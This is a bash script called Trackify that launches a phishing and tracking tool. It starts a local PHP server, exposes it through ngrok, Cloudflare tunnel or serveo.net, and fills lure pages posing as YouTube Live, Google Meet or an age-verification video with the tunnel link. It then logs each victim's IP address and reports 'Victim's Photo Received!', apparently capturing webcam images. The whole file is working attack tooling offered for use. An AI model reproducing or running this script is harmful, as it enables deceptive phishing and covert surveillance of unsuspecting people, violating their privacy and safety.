#!/bin/bash
# Trackify v1.5
# Powered by TechChip
# Credits goes to thelinuxchoice [github.com/thelinuxchoice/]

trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m ████████╗██████╗  █████╗  ██████╗██╗  ██╗██╗███████╗██╗   ██╗ \e[0m\n"
printf "\e[1;92m ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██║██╔════╝╚██╗ ██╔╝ \e[0m\n"
printf "\e[1;92m    ██║   ██████╔╝███████║██║     █████╔╝ ██║█████╗   ╚████╔╝  \e[0m\n"
printf "\e[1;92m    ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██║██╔══╝    ╚██╔╝   \e[0m\n"
printf "\e[1;92m    ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║        ██║    \e[0m\n"
printf "\e[1;92m    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝    \e[0m\n"
printf "\n"
printf "\e[1;91m                 ▄︻̷̿┻̿═━一  TRACKIFY  一━═┻̿︻̷▄                \e[0m\n"
printf " \e[1;93m Developed by: 0Cod3 \e[0m\n"
printf "\n"


printf "\n"


}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
checkcloudflared=$(ps aux | grep -o "cloudflared" | head -n1)

if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi

if [[ $checkcloudflared == *'cloudflared'* ]]; then
pkill -f -2 cloudflared > /dev/null 2>&1
killall -2 cloudflared > /dev/null 2>&1
fi

exit 1

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Victim's Photo Received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3

# Wait for sendlink file to have content (with timeout)
printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Waiting for Serveo link...\e[0m\n"
max_wait=30
wait_count=0
while [ $wait_count -lt $max_wait ]; do
    if [[ -s "sendlink" ]]; then
        # Check if file contains a URL
        if grep -qE "https://" sendlink 2>/dev/null; then
            break
        fi
    fi
    sleep 1
    wait_count=$((wait_count + 1))
done

# Strip ANSI codes first, then extract URL - this handles the escape sequences
send_link=$(cat sendlink 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' | grep -oE "https://[^[:space:]]+" | head -n1)
# If that fails, try with a more specific pattern
if [[ -z "$send_link" ]]; then
    send_link=$(cat sendlink 2>/dev/null | tr -d '\r' | sed 's/\x1b\[[0-9;]*m//g' | grep -oE "https://[a-zA-Z0-9\-\.]+\.(serveo\.net|serveousercontent\.com)" | head -n1)
fi
# Last resort: extract anything after https://
if [[ -z "$send_link" ]]; then
    send_link=$(cat sendlink 2>/dev/null | sed 's/.*https:\/\///' | sed 's/[[:space:]].*//' | head -n1)
    if [[ -n "$send_link" && "$send_link" != *"https://"* ]]; then
        send_link="https://$send_link"
    fi
fi
# Display the link
if [[ -n "$send_link" ]]; then
    printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Tracker Link:\e[0m\e[1;77m %s\e[0m\n\n' "$send_link"
else
    printf '\n\e[1;31m[!] Could not extract link from sendlink file\e[0m\n'
    printf '\e[1;77m[DEBUG] sendlink file exists: %s\e[0m\n' "$([ -e sendlink ] && echo 'yes' || echo 'no')"
    printf '\e[1;77m[DEBUG] sendlink file size: %s bytes\e[0m\n' "$([ -e sendlink ] && wc -c < sendlink || echo '0')"
    printf '\e[1;77m[DEBUG] sendlink contents:\e[0m\n'
    cat sendlink 2>/dev/null || echo "Cannot read sendlink file"
    printf '\e[1;77m[DEBUG] Cleaned contents (without ANSI codes):\e[0m\n'
    cat sendlink 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' || echo "Cannot process sendlink file"
    printf '\n'
fi

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] Error: Could not extract Ngrok link\e[0m\n"
    return 1
fi
generate_payload "$link"

}

cloudflared_server() {

command -v cloudflared > /dev/null 2>&1
if [[ $? -ne 0 ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Cloudflared not found. Downloading...\n"
    arch=$(uname -m)
    os=$(uname -s | tr '[:upper:]' '[:lower:]')
    
    if [[ "$os" == "linux" ]]; then
        if [[ "$arch" == *"arm"* ]] || [[ "$arch" == *"aarch64"* ]]; then
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared 2>/dev/null || \
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared 2>/dev/null
        elif [[ "$arch" == *"x86_64"* ]] || [[ "$arch" == *"amd64"* ]]; then
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared 2>/dev/null
        else
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared 2>/dev/null
        fi
    elif [[ "$os" == "darwin" ]]; then
        if [[ "$arch" == *"arm"* ]] || [[ "$arch" == *"aarch64"* ]]; then
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64 -O cloudflared 2>/dev/null
        else
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64 -O cloudflared 2>/dev/null
        fi
    else
        printf "\e[1;93m[!] Unsupported OS. Please install cloudflared manually.\e[0m\n"
        printf "\e[1;93m[!] Visit: https://github.com/cloudflare/cloudflared/releases\e[0m\n"
        exit 1
    fi
    
    if [[ -e cloudflared ]]; then
        chmod +x cloudflared
        printf "\e[1;92m[\e[0m*\e[1;92m] Cloudflared downloaded successfully\e[0m\n"
    else
        printf "\e[1;93m[!] Download failed. Please install cloudflared manually.\e[0m\n"
        exit 1
    fi
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 2

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Cloudflare tunnel...\e[0m\n"
if [[ -e cloudflared ]]; then
    ./cloudflared tunnel --url http://localhost:3333 > sendlink 2>&1 &
else
    cloudflared tunnel --url http://localhost:3333 > sendlink 2>&1 &
fi

sleep 8

# Wait for sendlink file to have content (with timeout)
printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Waiting for Cloudflare tunnel link...\e[0m\n"
max_wait=30
wait_count=0
while [ $wait_count -lt $max_wait ]; do
    if [[ -s "sendlink" ]]; then
        # Check if file contains a URL
        if grep -qE "https://.*trycloudflare.com" sendlink 2>/dev/null; then
            break
        fi
    fi
    sleep 1
    wait_count=$((wait_count + 1))
done

# Extract Cloudflare tunnel URL
send_link=$(cat sendlink 2>/dev/null | grep -oE "https://[a-zA-Z0-9\-]+\.trycloudflare\.com" | head -n1)

if [[ -n "$send_link" ]]; then
    printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Tracker Link:\e[0m\e[1;77m %s\e[0m\n\n' "$send_link"
    # Generate payload with the extracted link
    generate_payload "$send_link"
else
    printf '\n\e[1;31m[!] Could not extract Cloudflare tunnel link\e[0m\n'
    printf '\e[1;77m[DEBUG] sendlink file exists: %s\e[0m\n' "$([ -e sendlink ] && echo 'yes' || echo 'no')"
    printf '\e[1;77m[DEBUG] sendlink contents:\e[0m\n'
    cat sendlink 2>/dev/null | head -20 || echo "Cannot read sendlink file"
    printf '\n'
    return 1
fi

}

generate_payload() {
local link="$1"
if [[ -z "$link" ]]; then
    printf '\e[1;31m[!] Error: No link provided for payload generation\e[0m\n'
    return 1
fi

sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' Youtube.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
rm -rf index3.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' Gmeet.html > index2.html
elif [[ $option_tem -eq 3 ]]; then
sed 's+forwarding_link+'$link'+g' Sensitive.html > index2.html
fi
}

select_template() {
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m YouTube Live\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Google Meet\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Sensitive Video (Age Verification)\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
elif [[ $option_tem -eq 2 ]]; then
printf ""
elif [[ $option_tem -eq 3 ]]; then
printf ""
else
printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
sleep 1
select_template
fi
}

select_tunnel() {
printf "\n-----Choose a tunnel service----\n"
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Cloudflare Tunnel (cloudflared)\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
default_option_tunnel="3"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a tunnel service: [Default is 3] \e[0m' option_tunnel
option_tunnel="${option_tunnel:-${default_option_tunnel}}"
if [[ $option_tunnel -eq 1 ]]; then
printf "\e[1;93m[\e[0m*\e[1;93m] Selected: Ngrok\e[0m\n"
elif [[ $option_tunnel -eq 2 ]]; then
printf "\e[1;93m[\e[0m*\e[1;93m] Selected: Cloudflare Tunnel\e[0m\n"
elif [[ $option_tunnel -eq 3 ]]; then
printf "\e[1;93m[\e[0m*\e[1;93m] Selected: Serveo.net\e[0m\n"
else
printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
sleep 1
select_tunnel
fi
}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi
if [[ -e ~/.ngrok2/ngrok.yml ]]; then
printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
cat  ~/.ngrok2/ngrok.yml
read -p $'\n\e[1;92m[\e[0m+\e[0m\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
fi
else
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
fi

checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Tracker link is not generating, check following possible reason  \e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Tracker Link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
payload_ngrok
checkfound
}

trackify() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }

select_template
select_tunnel

# Check SSH requirement only for Serveo
if [[ $option_tunnel -eq 3 ]]; then
    command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
fi

start

}


payload() {

# Strip ANSI codes and extract URL - try multiple methods
send_link=$(cat sendlink 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' | grep -oE "https://[^[:space:]]*" | head -n1)
if [[ -z "$send_link" ]]; then
    # Alternative: extract any https URL pattern
    send_link=$(cat sendlink 2>/dev/null | tr -d '\r' | sed 's/\x1b\[[0-9;]*m//g' | grep -oE "https://[a-zA-Z0-9\-\.]+\.(serveo\.net|serveousercontent\.com)" | head -n1)
fi
if [[ -z "$send_link" ]]; then
    # Last resort: extract anything that looks like a URL
    send_link=$(cat sendlink 2>/dev/null | sed 's/.*https:\/\///' | sed 's/[[:space:]].*//' | head -n1)
    if [[ -n "$send_link" && "$send_link" != *"https://"* ]]; then
        send_link="https://$send_link"
    fi
fi

# Check if we successfully extracted a link
if [[ -z "$send_link" ]]; then
    printf '\e[1;31m[!] Error: Could not extract link for payload generation\e[0m\n'
    printf '\e[1;93m[!] Please check the sendlink file or try again\e[0m\n'
    return 1
fi

generate_payload "$send_link"

}

start() {

if [[ $option_tunnel -eq 1 ]]; then
    # Ngrok
    ngrok_server
elif [[ $option_tunnel -eq 2 ]]; then
    # Cloudflare Tunnel
    cloudflared_server
    if [[ $? -eq 0 ]]; then
        checkfound
    else
        printf "\e[1;31m[!] Failed to start Cloudflare tunnel\e[0m\n"
        exit 1
    fi
elif [[ $option_tunnel -eq 3 ]]; then
    # Serveo
    server
    payload
    checkfound
else
    printf "\e[1;31m[!] Invalid tunnel option\e[0m\n"
    exit 1
fi

}

banner
dependencies
trackify
